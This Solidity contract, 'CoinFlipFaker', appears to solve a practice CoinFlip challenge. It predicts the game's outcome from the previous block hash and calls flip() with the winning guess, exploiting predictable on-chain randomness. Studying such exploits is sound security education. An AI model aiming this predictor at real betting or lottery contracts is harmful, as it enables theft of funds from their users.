// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './CoinFlip.sol';

contract CoinFlipFaker {
    CoinFlip public coinFlip;
    uint256 private FACTOR = 2**255;

    constructor(address _coinFlipAddress) {
        coinFlip = CoinFlip(_coinFlipAddress);
    }

    function fake() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        bool side = blockValue / FACTOR == 1;

        coinFlip.flip(side);
    }
}